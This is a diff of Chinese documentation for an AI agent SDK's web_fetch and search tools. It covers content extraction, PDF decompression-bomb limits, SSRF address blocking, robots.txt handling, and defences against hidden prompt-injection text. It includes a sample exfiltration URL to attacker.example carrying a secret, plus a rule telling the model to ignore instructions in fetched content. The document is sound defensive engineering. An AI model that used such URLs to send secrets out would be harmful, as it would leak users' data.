@@ -62,7 +62,7 @@ arXiv 的结果还带有 `authors`、`pdfUrl`、`updated` 和 `category`；仓�
 ### `web_fetch` 保留什么 {#what-web-fetch-keeps}
 
 - **HTML** 会变成 Markdown（使用 `format: 'text'` 时则变成纯文本），不依赖任何包：保留主要内容（`<main>`，否则是最长的 `<article>`，再否则是 `<body>`），连同其中的各级标题、段落、列表、转换为绝对地址的链接、表格、代码块和引用。脚本、样式、表单控件、导航、页面的页眉和页脚、侧栏、对话框、每一个隐藏元素以及浏览器从不显示的内容（`noframes`、`noembed`、ruby 注音两侧的括号）都会被丢弃；表单中的文字、标记为 `hidden="until-found"` 的区块以及 `<noscript>` 的内容（即不运行 JavaScript 的浏览器所显示的页面）会被保留。页面标题取自 `og:title` 或 `<title>`，日期取自网页的元数据、它的 JSON-LD 或某个 `<time>`，语言取自 `<html lang>`。网页指明的字符集会被正确解码，压缩过的应答也一样会被解压。处理量是有上限的：最多读取 100,000 个元素、128 层嵌套（超出时为 `truncated: true`），提取工作在 5 秒后停止；如果调用剩下的时间更少，则会更早停止。
-- **PDF** 的文本用可选的包 [`unpdf`](https://github.com/unjs/unpdf)（需要 Node.js 22 或更高版本）读取：`npm install unpdf`。没有安装它时，`web_fetch` 会说明这一点。标题和日期取自文档本身。PDF 在一个工作线程中读取，当进程增长超过 256 MB、超过 20 秒或调用结束时，这个线程就会被停止：一个解压后膨胀到数 GB 的小 PDF 既无法阻塞进程，也无法耗尽它的资源。
+- **PDF** 的文本用可选的包 [`unpdf`](https://github.com/unjs/unpdf)（需要 Node.js 22 或更高版本）读取：`npm install unpdf`。没有安装它时，`web_fetch` 会说明这一点。标题和日期取自文档本身。进程中的 PDF 一次只读取一个，每个都在一个工作线程中读取。在 pdf.js 读取 PDF 之前，工作线程会让它的流经过各自的过滤器解压（Flate、LZW 和 RunLength，包括串联的情况，以及包在它们外面的 ASCII85 和 ASCIIHex），总量超过 256 MB 时就拒绝这个 PDF：这项测量不需要进程其余部分的任何东西，因此一个解压后膨胀到数 GB 的小 PDF 即使在主线程繁忙时也会被拒绝。它无法测量的流（加密的，或使用它不认识的过滤器的，比如图像的流）交给 pdf.js 处理。作为第二道防线，当读取期间进程增长超过 1 GB、超过 20 秒或调用结束时，工作线程就会被停止；等待轮到它的时间也计入调用的时限。
 - **文本**应答（纯文本、Markdown、CSV、JSON、XML、订阅源）按原样返回。其他任何类型（图片、压缩包、视频……）都会在读取应答体之前被拒绝。
 - **`truncated: true`** 表示内容被截断了：原因可能是 `maxChars`，可能是网页比 `maxResponseBytes` 更长或包含超过 100,000 个元素，也可能是 PDF 的页数超过了 `maxPdfPages`。
 - **`hint: 'js-rendered'`** 表示这个网页似乎是用 JavaScript 来构建内容的，而 `web_fetch` 不运行 JavaScript：它拿回来的内容几乎是空的。
@@ -127,7 +127,7 @@ const intranetSearch: SearchProvider = {
 | `language` | — | 没有指定语言的搜索所使用的语言；也决定 `wikipedia_search` 使用哪个语言版本的 Wikipedia。 |
 | `userAgent` | `sdk-ai-agents (+https://github.com/nicolashedoire/sdk-ai-agents)` | 随每个请求发送。无论用户代理是什么，robots.txt 规则始终按 `sdk-ai-agents` 进行匹配。 |
 | `timeoutMs` | `15000` | 每个请求的超时：每一跳重定向、每一次读取 robots.txt 都单独计时。一次调用会发出多个请求，因此耗时可能是它的数倍：`callTimeoutMs` 限制整个调用。 |
-| `callTimeoutMs` | `60000` | 整个调用的时限，无论调用在等待什么：robots.txt、节奏控制、每一次重定向、应答体，以及网页或 PDF 的提取。超过时限后，这一切都会被中止，调用以 `WebTimeoutError` 失败。 |
+| `callTimeoutMs` | `60000` | 整个调用的时限，无论调用在等待什么：robots.txt、节奏控制、每一次重定向、应答体，以及网页或 PDF 的提取。超过时限后，这一切都会被中止，调用以 `WebTimeoutError` 失败。它限制的是每一次尝试：使用 `retry` 时，一次调用最长可能耗时这个值的 `maxRetries + 1` 倍，再加上各次尝试之间的等待时间。 |
 | `maxResponseBytes` | `2000000` | 读取的应答体的最大字节数，按解压后计算。 |
 | `maxRedirects` | `5` | 最多跟随的重定向次数，每一次都会重新检查。 |
 | `hostIntervalMs` | `1000` | 对同一个主机的两次 `web_fetch` 请求之间的最短间隔。 |
@@ -147,7 +147,7 @@ const intranetSearch: SearchProvider = {
 1. **公共互联网之外的地址一律不行。** 环回地址（`127.0.0.1`、`::1`、`localhost`）、私有网络（`10.x`、`172.16.x`、`192.168.x`、`fc00::/7`）、链路本地地址和云元数据服务（`169.254.169.254`）、运营商级 NAT、组播地址和保留地址段都会被拒绝，内含其中某个地址的 IPv6 地址（`::ffff:127.0.0.1`、`::ffff:0:127.0.0.1`、NAT64、6to4）也一样。直接写在 URL 中的 IP 会在连接之前检查；主机名则由连接本身所用的那次解析来检查，所以它解析出的每个地址都会在连接建立的那一刻被检查：在检查和连接之间发生变化的 DNS 应答无法蒙混过关。每一次重定向都会由客户端自己重新检查，无论是否读取 robots.txt。
 2. **例外通道必须明确打开。** `allowPrivateNetwork: ['intranet.example']` 只放行列出的主机，`true` 则放行所有主机。你提供给提供商或来源的 `baseUrl` 来自你的代码，而不是来自模型：即使它在本机上（比如 `localhost` 上的 SearXNG）也可以访问，但只限于它自己的源，也只限于这个提供商或来源的请求——重定向到别处时会被检查，而 `web_fetch` 仍然会拒绝它。这项豁免在调用 `webTools()` 时就已确定（提供商通过 `configuredOrigin` 声明它），绝不由请求决定。默认的公共端点（DuckDuckGo、arXiv、Wikipedia、GitHub）永远不会被豁免：它们的 DNS 不在你的控制之下。
 3. **只允许 http 和 https**，https 永远不会被重定向降级为 http，最多跟随 `maxRedirects` 次重定向，TLS 证书始终会被验证。API 密钥或令牌永远不会被发往重定向所指向的另一个源。
-4. **有上限。** 整个调用有时限（`callTimeoutMs`），每个请求都有超时；最多读取 `maxResponseBytes`（按解压后计算），其余部分根本不会下载；PDF 受 `maxPdfBytes`（声明自己更大的 PDF 在下载之前就会被拒绝）和 `maxPdfPages` 限制，并在一个超过 256 MB 或 20 秒就会被停止的工作线程中读取；网页的提取限制在 100,000 个元素和 5 秒的处理之内；内容受 `maxChars` 限制。下载之后的任何处理都无法阻塞进程：robots.txt 的匹配在线性时间内完成，HTML 的处理流程中没有平方复杂度的步骤。
+4. **有上限。** 整个调用有时限（`callTimeoutMs`），每个请求都有超时；最多读取 `maxResponseBytes`（按解压后计算），其余部分根本不会下载；PDF 受 `maxPdfBytes`（声明自己更大的 PDF 在下载之前就会被拒绝）和 `maxPdfPages` 限制，并一次一个地在工作线程中读取，这个线程会在 pdf.js 读取之前拒绝流解压后超过 256 MB 的 PDF，并在进程增长超过 1 GB 或超过 20 秒时被停止；网页的提取限制在 100,000 个元素和 5 秒的处理之内；内容受 `maxChars` 限制。下载之后的任何处理都无法阻塞进程：robots.txt 的匹配在线性时间内完成，HTML 的处理流程中没有平方复杂度的步骤。
 5. **守礼。** `web_fetch` 会读取 robots.txt（[RFC 9309](https://www.rfc-editor.org/rfc/rfc9309)），绝不获取它对 `sdk-ai-agents` 禁止访问的内容，重定向也包括在内：先看点名 `sdk-ai-agents` 的那一组规则，否则看 `*` 那一组；最长的规则胜出，打平时 `Allow` 胜出；支持 `*` 和 `$` 模式；非保留字符的转义在比较之前会被解码（`%7E` 就是 `~`）。缺失的 robots.txt（4xx）允许一切；获取失败（5xx、429）或无法访问的 robots.txt 禁止一切。读取 robots.txt 不会推迟第一个网页；`Crawl-delay` 会拉开此后请求的间隔，超过 30 秒的延迟会让下一个网页在这段时间结束前被拒绝。对每个主机的请求都有节奏控制（网页 1 秒，DuckDuckGo 1.5 秒，arXiv 3 秒），应答会被缓存，用户代理会说明是谁在请求。搜索 API 不属于爬取对象：robots.txt 不适用于它们。
 6. **内容就是数据。** 每个应答都写着 `untrusted: true`，工具描述也会告诉模型绝不要遵循其中出现的指令。在提取之前，`web_fetch` 会丢弃读者看不见、模型却会读到的东西：`hidden`、`aria-hidden="true"`、`display:none`、`visibility:hidden`、字号为零或不透明度为零的元素，HTML 注释，以及不可见字符：零宽字符和双向控制字符、Tags 区块（它可以用不可见的方式拼写文字）和变体选择符。搜索结果和错误消息也会以同样的方式清理；错误最多引用服务器应答中的一行，并标记为不可信。研究会把结果放在不可信数据的标记之间展示给它的模型。
 7. **受治理。** `web_fetch` 的风险是中等，而不是低：URL 由模型选择，而一个 URL 就能把数据带出去（`https://attacker.example/?q=<secret>`）。不要把它交给持有机密的智能体，或者让人审批每一次调用：
